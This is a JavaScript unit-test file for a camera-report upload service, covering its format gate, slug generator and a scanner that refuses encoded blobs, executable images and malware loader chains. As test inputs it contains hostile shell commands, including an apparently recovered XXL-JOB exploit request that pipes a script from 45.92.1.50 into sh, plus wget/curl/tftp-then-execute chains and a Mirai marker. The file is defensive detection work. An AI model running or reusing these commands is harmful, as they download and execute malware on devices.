// Unit tests for the format gate, metadata extraction and the shape scanner.
// No wrangler needed:  node tests/unit.mjs
//
// The HTTP and storage behaviour is covered by tests/smoke.sh, and the admin page by
// tests/web.sh. Nothing here censors anything: that is the device's job, by design.

import { parseEnvelope, scanShape as scanShapeRaw, measureShape as measureRaw, SHAPE_DEFAULTS } from '../src/envelope.js';

// The scanner works on raw bytes; these wrappers keep the tests readable.
const enc = new TextEncoder();
const measureShape = (t) => measureRaw(enc.encode(t));
const scanShape = (t, limits) => scanShapeRaw(enc.encode(t), t, limits);
import { newSlug, isSlug, DEFAULT_SLUG_LEN } from '../src/slug.js';

let pass = 0;
let fail = 0;

function ok(name, cond, detail = '') {
	if (cond) {
		pass++;
		console.log(`  ok   ${name}`);
	} else {
		fail++;
		console.log(`  FAIL ${name}${detail ? `\n       ${detail}` : ''}`);
	}
}

function eq(name, got, want) {
	ok(name, got === want, `expected ${JSON.stringify(want)}, got ${JSON.stringify(got)}`);
}

// Mirrors the shape real firmware emits, including the blank-line padding and the
// quoted comma-separated BUILD_ID.
const REPORT = `Sun Aug  9 10:26:00 GMT 2026
 10:26:00 up  2:30,  load average: 1.62, 1.71, 1.71
Linux ing-device 3.10.14__isvp_swan_1.0__ #2 PREEMPT mips GNU/Linux


===[ THINGINO ]=================================================================


NAME=Thingino
ID=thingino
VERSION="2 (Figata)"
VERSION_ID=1
SOC=t31
SOC_ARCH=xburst1
IMAGE_ID=test_cam_t31x_gc4653_eth
IMAGE_NAME="Test Cam (T31X, GC4653, ETH)"
BUILD_ID="master+7e438d3, 2026-08-09 07:51:40 +0000"
HOSTNAME=ing-device


===[ SOC ]======================================================================


t31x
`;

console.log('-- slugs');
eq('default length', newSlug().length, DEFAULT_SLUG_LEN);
eq('default is 8', DEFAULT_SLUG_LEN, 8);
eq('explicit length honoured', newSlug(6).length, 6);
eq('over-long request clamped', newSlug(99).length, 26);
eq('under-short request clamped', newSlug(1).length, 4);
eq('garbage length falls back', newSlug('x').length, 8);
ok('generated slug validates', isSlug(newSlug()));
// Validation spans a range on purpose: shortening the generated length must not
// 404 the longer slugs already pasted into issues.
ok('legacy 13-char slug still validates', isSlug('d4hnbzp8qdr3h'));
ok('short 4-char slug validates', isSlug('5t7v'));
ok('ambiguous letters rejected', !isSlug('iloumnpq'));
ok('uppercase rejected', !isSlug('D4HNBZP8'));
ok('too long rejected', !isSlug('a'.repeat(27)));
ok('empty rejected', !isSlug(''));
{
	// No modulo bias: 256 is an exact multiple of the 32-char alphabet.
	const counts = new Map();
	for (let i = 0; i < 20000; i++) for (const c of newSlug(8)) counts.set(c, (counts.get(c) || 0) + 1);
	const vals = [...counts.values()];
	const spread = (Math.max(...vals) - Math.min(...vals)) / (vals.reduce((a, b) => a + b, 0) / vals.length);
	ok(`alphabet used evenly (${counts.size}/32 chars, spread ${(spread * 100).toFixed(1)}%)`, counts.size === 32 && spread < 0.15);
}

console.log('-- envelope gate');
{
	const r = parseEnvelope(REPORT);
	ok('real-shaped report passes', r.ok, r.error);
	// The gate answers one question and nothing else. SOC, IMAGE_ID and BUILD_ID were lifted
	// into columns once, and a declared censor ruleset into a fourth; neither is something to
	// reintroduce by accident, so the shape of the answer is pinned.
	eq('answers nothing but ok', Object.keys(r).join(','), 'ok');
}
{
	const r = parseEnvelope('just some logs\nnothing structured here\n');
	ok('plain text rejected', !r.ok);
	ok('error names the missing block', /THINGINO/.test(r.error), r.error);
}
{
	// The section header alone is not enough, or quoting a report in a log body
	// would be a way through.
	const r = parseEnvelope('===[ THINGINO ]===\nNAME=Something\nID=notthingino\n');
	ok('marker without ID=thingino rejected', !r.ok);
}
{
	const r = parseEnvelope('ID=thingino\nSOC=t31\n');
	ok('ID line without the marker rejected', !r.ok);
}
{
	// A report carrying the old censor-ruleset line is still just a report: the line is data in
	// the body now, not something the gate reads.
	const r = parseEnvelope(REPORT.replace('NAME=Thingino', '#redacted: 4\nNAME=Thingino'));
	ok('a report with a #redacted line still passes', r.ok, r.error);
	eq('and the gate reports nothing extra', Object.keys(r).join(','), 'ok');
}
{
	// Marker past the 8 KB window must not count.
	const r = parseEnvelope('x'.repeat(9000) + '\n===[ THINGINO ]===\nID=thingino\n');
	ok('marker beyond the header window rejected', !r.ok);
}

console.log('-- shape: a real report is nothing like a payload');
{
	// Compared against the live defaults, not against numbers copied into the label. The
	// thresholds have moved several times and these labels went on claiming the old ones,
	// still passing, for as long as nobody read them.
	const D = SHAPE_DEFAULTS;
	const m = measureShape(REPORT);
	ok(`real report blob ratio ${m.blobPercent.toFixed(2)}% (limit ${D.blobPercent})`, m.blobPercent < D.blobPercent);
	ok(`real report longest token ${m.maxToken} (limit ${D.maxToken})`, m.maxToken < D.maxToken);
	ok(`real report consecutive b64 lines ${m.maxB64Lines} (limit ${D.maxB64Lines})`, m.maxB64Lines <= D.maxB64Lines);
	ok(
		`real report printable ${m.printablePercent.toFixed(3)}% (limit ${D.minPrintablePercent})`,
		m.printablePercent > D.minPrintablePercent,
	);
	// The fixture is a trimmed report, so it has fewer sections than the real 30.
	eq('sections counted', m.sections, 2);
	eq('trimmed fixture fails only on section count', scanShape(REPORT).failed, 'too_few_sections');
	eq('with the threshold lowered it passes clean', scanShape(REPORT, { minSections: 2 }).failed, null);
}

const envelope = (body) => REPORT + '\n===[ DMESG ]===\n\n' + body + '\n';
const b64 = (n) => {
	let out = '';
	const A = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
	for (let i = 0; i < n; i++) out += A[(i * 31 + 7) % 64];
	return out;
};

console.log('-- shape: payloads');
{
	// One enormous unbroken token: the ratio catches it before the length does.
	eq('unwrapped blob', scanShape(envelope(b64(80000)), { minSections: 2 }).failed, 'encoded_blob');
}
{
	// Wrapped at 64 columns, PEM style, which defeats a token-length check.
	const wrapped = Array.from({ length: 1200 }, (_, i) => b64(64)).join('\n');
	eq('wrapped blob', scanShape(envelope(wrapped), { minSections: 2 }).failed, 'encoded_blob');
}
{
	// A SMALL wrapped blob hidden in a big log: the ratio misses it, the
	// consecutive-line check is what catches it. This is why both exist.
	const filler = Array.from({ length: 6000 }, (_, i) => `[   ${i}.000000] some kernel log line here ${i}`).join('\n');
	const small = Array.from({ length: 30 }, () => b64(64)).join('\n');
	const body = filler + '\n' + small + '\n' + filler;
	const m = measureShape(envelope(body));
	ok(`small blob evades the ratio (${m.blobPercent.toFixed(2)}%)`, m.blobPercent < SHAPE_DEFAULTS.blobPercent);
	eq('but the line run catches it', scanShape(envelope(body), { minSections: 2 }).failed, 'encoded_block');
}
{
	// A long token in an otherwise normal log: ratio is fine, length is not. Sized off the
	// live limit, since raising it to 1024 for IPv6 mount options made 900 legitimate.
	const filler = Array.from({ length: 6000 }, (_, i) => `[   ${i}.000000] kernel log ${i}`).join('\n');
	const body = filler + '\n' + 'x'.repeat(SHAPE_DEFAULTS.maxToken + 1) + '\n' + filler;
	const m = measureShape(envelope(body));
	ok(`long token evades the ratio (${m.blobPercent.toFixed(2)}%)`, m.blobPercent < SHAPE_DEFAULTS.blobPercent);
	eq('but the token length catches it', scanShape(envelope(body), { minSections: 2 }).failed, 'oversized_token');
}
{
	// Newlines every 40 chars so this reaches the printable check rather than
	// tripping the token-length backstop first.
	let bin = '';
	for (let i = 0; i < 5000; i++) bin += (i % 40 === 39) ? '\n' : String.fromCharCode(i % 8);
	eq('raw binary', scanShape(envelope(bin), { minSections: 2 }).failed, 'binary_content');
}
{
	eq('base64 PE header', scanShape(envelope('TVqQAAMAAAAEAAAA'), { minSections: 2 }).failed, 'executable_image');
	eq('base64 ELF header', scanShape(envelope('f0VMRgIBAQAAAA'), { minSections: 2 }).failed, 'executable_image');
	eq('raw ELF magic', scanShape(envelope('\x7fELF something'), { minSections: 2 }).failed, 'executable_image');
	eq('base64 gzip', scanShape(envelope('H4sIAAAAAAAAA+3S'), { minSections: 2 }).failed, 'executable_image');
	eq('base64 zip', scanShape(envelope('UEsDBBQAAAAIAA'), { minSections: 2 }).failed, 'executable_image');
	eq('raw zip magic', scanShape(envelope('PK\x03\x04 stuff'), { minSections: 2 }).failed, 'executable_image');
}

console.log('-- shape: the dropper actually recovered from the old service');
{
	// Reconstructed from the XXL-JOB /run POST found on the old bin.
	const real = 'POST /run HTTP/1.1\nHost: 192.0.2.10:9999\nXXL-JOB-ACCESS-TOKEN: default_token\n\n' +
		'{"glueType":"GLUE_SHELL","glueSource":"(wget -qO- http://45.92.1.50/rondo.aqg.sh?=`bbe56f1d' +
		'||busybox wget -qO- http://45.92.1.50/rondo.aqg.sh?=`bbe56f1d||curl -s http://45.92.1.50/rondo.aqg.sh)|sh&"}';
	// Gate 1 is what stops it, and that is the point: it never reaches gate 2.
	ok('format gate rejects it outright', !parseEnvelope(real).ok);
	// If it were ever wrapped in a valid envelope, gate 2 picks it up.
	eq('wrapped in an envelope, the dropper chain fires', scanShape(envelope(real), { minSections: 2 }).failed, 'dropper_chain');
	eq('and the check can be turned off', scanShape(envelope(real), { minSections: 2, blockDroppers: false }).failed, null);
}
{
	const clean = envelope('[    0.000000] Linux version 3.10.14\nwget is not used here\ncurl neither');
	eq('log prose mentioning wget and curl is fine', scanShape(clean, { minSections: 2 }).failed, null);
}

// Everything below comes from measuring real reports pulled off three devices
// (T31X 410 KiB/30 sections, T40N 58 KiB/24, T21N 52 KiB/23). The reports themselves are
// not committed, because they carry addresses, hostnames and network topology; the cases
// they exposed are reproduced synthetically instead.
console.log('-- what the lab samples exposed');

// The producing tool emits a section header only when the command made output, so the set
// shrinks on a degraded device and differs between its versions: the two script
// versions in the lab do not even agree on the list. Only ENV, KMOD-2, streamer and
// WPA-CONF are unconditional, and THINGINO comes from os-release, so five is the floor. It
// used to sit one above a limit of four.
const FLOOR_SECTIONS = ['THINGINO', 'ENV', 'KMOD-2', 'streamer', 'WPA-CONF'];
{
	const floor =
		'Sun Aug  9 10:26:00 GMT 2026\n' +
		FLOOR_SECTIONS.map((s) => `\n\n===[ ${s} ]${'='.repeat(73 - s.length)}\n\n` + (s === 'THINGINO' ? 'NAME=Thingino\nID=thingino\nSOC=t31\n' : 'some output\n')).join('');
	const m = measureShape(floor);
	eq('floor case has five sections', m.sections, 5);
	eq('and all five are recognised', m.knownSections, 5);
	ok(`floor case clears the section floor (${m.sections} >= ${SHAPE_DEFAULTS.minSections})`, m.sections >= SHAPE_DEFAULTS.minSections);
	eq('so a degraded device is still accepted', scanShape(floor).failed, null);
}
{
	// Counting sections was the weaker half: a fabricated wrapper just adds header lines,
	// and four junk ones used to be enough to clear a limit of four. Requiring recognised
	// NAMES refuses it, which is why the check changed shape rather than being loosened.
	const fake = 'x\n===[ THINGINO ]===\nNAME=Thingino\nID=thingino\n===[ zz ]===\n===[ yy ]===\n===[ xx ]===\npayload\n';
	eq('four sections, only one of them real', measureShape(fake).knownSections, 1);
	eq('a hand-made wrapper is refused on names', scanShape(fake).failed, 'no_known_sections');
	const bare = 'x\n===[ THINGINO ]===\nNAME=Thingino\nID=thingino\npayload\n';
	eq('and a bare envelope on the count', scanShape(bare).failed, 'too_few_sections');
}
{
	// The longest token in every real report is the NFS option string in MOUNT, 138-190
	// chars. Over IPv6 the kernel prints the literal address into mountaddr= and addr=,
	// which is ordinary on this network and was 90% of the old 384 limit.
	const v6 =
		'(rw,relatime,vers=4.2,rsize=1048576,wsize=1048576,namlen=255,hard,proto=tcp6,' +
		'timeo=600,retrans=2,sec=sys,mountaddr=2001:470:1f0b:1234:2a05:d014:abcd:1234,' +
		'mountvers=3,mountproto=tcp6,local_lock=none,addr=2001:470:1f0b:1234:2a05:d014:abcd:1234,' +
		'clientaddr=2001:470:1f0b:1234:2a05:d014:abcd:5678,lookupcache=all)';
	ok(`IPv6 NFSv4 option token is ${v6.length} chars, ${((v6.length / 384) * 100).toFixed(0)}% of the old 384 limit`, v6.length > 300 && v6.length < 384);
	// Kerberos and a few tuning options do not cross the old limit, they come within 19
	// characters of it. That is the point: no synthetic case here ever exceeded 384, and the
	// argument for raising it is the margin, not a demonstrated failure. One more mount
	// option on an ordinary IPv6 NFS mount was all it took.
	const v6plus = v6.slice(0, -1) + ',sec=krb5p,nconnect=4,max_connect=8,write=eager,softreval)';
	ok(`the same mount with krb5p reaches ${v6plus.length}, ${384 - v6plus.length} short of the old limit`, v6plus.length > 384 * 0.9 && v6plus.length < 384);
	for (const [name, opts] of [['IPv6 NFSv4', v6], ['IPv6 NFSv4 with krb5p', v6plus]]) {
		const doc = envelope(`[2001:470:1f0b:1234::1]:/export on /mnt/nfs type nfs ${opts}\n`);
		eq(`a ${name} mount line is accepted`, scanShape(doc, { minSections: 2 }).failed, null);
	}
}
{
	// WIFI-SCAN prints `wpa_cli scan_results` verbatim, and accented or emoji SSIDs are
	// ordinary. Counting only bytes 0x20-0x7e made all of that read as binary: 200 such rows
	// on a small report measured 94.1% printable and were refused.
	const row = (i) => `00:11:22:33:44:${(i % 256).toString(16).padStart(2, '0')}\t2437\t-50\t[WPA2-PSK-CCMP][ESS]\tCafé ☕ Zuhause—${i}`;
	const scan = Array.from({ length: 400 }, (_, i) => row(i)).join('\n');
	const doc = envelope(scan);
	const m = measureShape(doc);
	eq('valid UTF-8 counts as text, not binary', m.printablePercent, 100);
	ok(`400 non-ASCII SSID rows measure ${m.nonAsciiPercent.toFixed(1)}% non-ASCII`, m.nonAsciiPercent > 5);
	eq('and are accepted', scanShape(doc, { minSections: 2 }).failed, null);
}
{
	// Malformed sequences must NOT be credited, or the relaxation would swallow binary.
	// A lead byte with a missing continuation, an orphan continuation, and the ranges that
	// are never valid UTF-8 at all.
	//
	// measureRaw, not the measureShape wrapper: the wrapper TextEncoder-encodes its argument,
	// so handing it a Uint8Array stringifies it to "195,169" and every byte case measured
	// 100% printable. That passed against a deliberately broken scanner.
	const bad = (bytes) => measureRaw(new Uint8Array(bytes)).printablePercent;
	eq('truncated two-byte sequence is not text', bad([0xc3]), 0);
	eq('orphan continuation byte is not text', bad([0xbf]), 0);
	eq('overlong lead 0xc0 is not text', bad([0xc0, 0x80]), 0);
	eq('out-of-range lead 0xf5 is not text', bad([0xf5, 0x80, 0x80, 0x80]), 0);
	eq('a well-formed three-byte sequence is text', bad([0xe2, 0x80, 0x94]), 100);
	// A lead immediately followed by another lead: the first is abandoned, the second stands.
	eq('lead followed by lead credits only the complete one', Math.round(bad([0xc3, 0xc3, 0xa9]) * 100) / 100, 66.67);
}
{
	// Treating UTF-8 as text opened one real gap: a payload re-encoded as multi-byte
	// sequences is text by that measure. Wrapped so the token backstop cannot fire either.
	let enc = '';
	for (let i = 0; i < 12000; i++) {
		enc += String.fromCodePoint(0x100 + (i * 37) % 256);
		if (i % 32 === 31) enc += '\n';
	}
	const doc = envelope(enc);
	const m = measureShape(doc);
	eq('it still measures as text', m.printablePercent, 100);
	ok(`but ${m.nonAsciiPercent.toFixed(1)}% non-ASCII`, m.nonAsciiPercent > SHAPE_DEFAULTS.maxNonAsciiPercent);
	eq('so the non-ASCII ratio refuses it', scanShape(doc, { minSections: 2 }).failed, 'encoded_text');
}
console.log('-- encoded data is counted per token, not per run');
{
	// Run length was what an attacker set for free. A base64 payload behind a fake kernel-log
	// prefix measured 64.9% at 40 characters per line and 0.0% at 39, because only runs of 40
	// or more were counted. Counting qualifying TOKENS instead closes the whole family.
	const payload = (() => {
		let s = '';
		const A = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
		for (let i = 0; i < 48000; i++) s += A[(i * 37 + 11) % 64];
		return s;
	})();
	const chunked = (w) => {
		let out = '';
		for (let i = 0; i < payload.length; i += w) out += `[  ${i / w}.000000] data ${payload.slice(i, i + w)}\n`;
		return out;
	};
	for (const w of [64, 40, 39, 32, 24]) {
		const doc = envelope(chunked(w));
		eq(`base64 chunked at ${w} is refused`, scanShape(doc, { minSections: 2 }).failed, 'encoded_blob');
	}
	// Base32 has no lowercase at all, which is why the class test is two-of-three and not three.
	let b32 = '';
	const A32 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
	for (let i = 0; i < 48000; i++) b32 += A32[(i * 11 + 5) % 32];
	let b32Chunked = '';
	for (let i = 0; i < b32.length; i += 39) b32Chunked += `[  ${i / 39}.000000] data ${b32.slice(i, i + 39)}\n`;
	eq('base32 is refused too', scanShape(envelope(b32Chunked), { minSections: 2 }).failed, 'encoded_blob');
}
{
	// The other direction: content that IS mostly long hash or key tokens must be accepted.
	// `sha256sum` output measured 79% under the run rule and was refused.
	const hash = (i) => (i * 2654435761 >>> 0).toString(16).padStart(8, '0').repeat(8);
	const listing = Array.from({ length: 40 }, (_, i) => `${hash(i)}  /usr/bin/tool${i}`).join('\n');
	eq('a sha256sum listing is accepted', scanShape(envelope(listing), { minSections: 2 }).failed, null);
	eq('and charges nothing at all', measureShape(envelope(listing)).blobBytes, 0);
	// Digest lengths only. Hex at some other width is a payload, not a checksum.
	const oddHex = Array.from({ length: 400 }, (_, i) => `line ${i} ` + hash(i).slice(0, 50)).join('\n');
	eq('hex at a non-digest width is refused', scanShape(envelope(oddHex), { minSections: 2 }).failed, 'encoded_blob');
	// A single key in a small file is a high ratio but a trivial amount of encoded data.
	const oneKey = 'ctrl_interface=/var/run/wpa_supplicant\nnetwork={\n\tssid="REDACTED"\n\tpsk=' + hash(7) + '\n}\n';
	ok(`one 64-hex psk in a ${oneKey.length} byte config`, oneKey.length < 200);
	eq('is accepted', scanShapeRaw(enc.encode(oneKey), oneKey, { minSections: 0, minKnownSections: 0 }).failed, null);
	// CamelCase identifiers are mixed-case with no digits, which is what the digit floor is for.
	const json = '{\n  "InventoryPollIntervalSeconds": 1800,\n  "UpdatePollIntervalSeconds": 1800,\n  "RetryPollIntervalSeconds": 300\n}\n';
	eq('a CamelCase JSON config is accepted', scanShapeRaw(enc.encode(json), json, { minSections: 0, minKnownSections: 0 }).failed, null);
	// Long lowercase-and-slash paths are one character class, so they are not encoded data.
	const paths = Array.from({ length: 200 }, (_, i) => `/sys/class/ieee80211/phy${i}/statistics/rx`).join('\n');
	eq('sysfs paths are accepted', scanShapeRaw(enc.encode(paths), paths, { minSections: 0, minKnownSections: 0 }).failed, null);
}

console.log('-- magic at every base64 alignment');
{
	// A literal only matches when the magic lands on a 3-byte boundary of the encoded stream,
	// so the old alignment-0-only list was defeated by prepending one byte. Encode each magic
	// at all three offsets and require all three to be caught.
	const b64 = (bytes) => Buffer.from(bytes).toString('base64');
	const magics = {
		ELF: [0x7f, 0x45, 0x4c, 0x46, 1, 1, 1, 0],
		PE: [0x4d, 0x5a, 0x90, 0x00, 3, 0, 0, 0],
		gzip: [0x1f, 0x8b, 0x08, 0x00, 0, 0, 0, 0],
		zip: [0x50, 0x4b, 0x03, 0x04, 0x14, 0, 0, 0],
		shebang: [...'#!/bin/sh\nexit\n'].map((c) => c.charCodeAt(0)),
	};
	for (const [name, magic] of Object.entries(magics)) {
		for (let pad = 0; pad < 3; pad++) {
			const body = b64([...new Array(pad).fill(0x41), ...magic, ...new Array(600).fill(0x7a)]);
			eq(`${name} caught at alignment ${pad}`, scanShape(envelope(body), { minSections: 2 }).failed, 'executable_image');
		}
	}
}

console.log('-- loader chains beyond wget|sh');
{
	const cases = {
		'busybox as the interpreter': 'busybox wget -qO- http://1.2.3.4/x | busybox sh',
		'a fetch into python': 'curl -s http://1.2.3.4/a.py | python3',
		'decode then run': 'echo QUFB | base64 -d | sh',
		'fetch then chmod then run': 'wget http://1.2.3.4/x -O /tmp/x; chmod 777 /tmp/x; /tmp/x',
		'tftp rather than http': 'tftp -g -r payload 1.2.3.4 && chmod +x payload',
		'a per-arch binary as the last path element': 'wget http://45.92.1.50/mips',
		'a family marker': '/bin/busybox MIRAI',
	};
	for (const [name, body] of Object.entries(cases)) {
		eq(name, scanShape(envelope(body), { minSections: 2 }).failed, 'dropper_chain');
	}
	// And the shapes that merely look similar must not fire. Checked against 962 real firmware
	// scripts, including every init script in the tree, with no matches.
	const benign = {
		'a mirror url ending in an arch name': 'wget https://mirror.example.org/debian/pool/main/x86_64/foo.deb -O /tmp/foo.deb',
		'chmod with no fetch anywhere near': 'install -d /etc/foo\nchmod 755 /etc/foo\n',
		'prose mentioning the tools': 'use wget or curl to fetch it, then run sh manually',
		'a kernel crosstool url': 'http://kernel.org/pub/tools/crosstool/files/bin/x86_64/',
	};
	for (const [name, body] of Object.entries(benign)) {
		eq(`benign: ${name}`, scanShape(envelope(body), { minSections: 2 }).failed, null);
	}
}

{
	// Binary must still be refused now that valid UTF-8 is credited. Random bytes rarely
	// form well-formed sequences, which is what keeps the margin wide.
	const rnd = new Uint8Array(60000);
	let seed = 12345;
	for (let i = 0; i < rnd.length; i++) {
		seed = (seed * 1103515245 + 12345) & 0x7fffffff;
		rnd[i] = (seed >> 16) & 0xff;
	}
	const m = measureRaw(rnd);
	ok(`uniform bytes measure ${m.printablePercent.toFixed(1)}% text, floor ${SHAPE_DEFAULTS.minPrintablePercent}`, m.printablePercent < 60);
	eq('raw binary is still refused', scanShapeRaw(rnd, '', { minSections: 0, minKnownSections: 0 }).failed, 'binary_content');
}

console.log(`\npassed: ${pass}   failed: ${fail}`);
process.exit(fail === 0 ? 0 : 1);
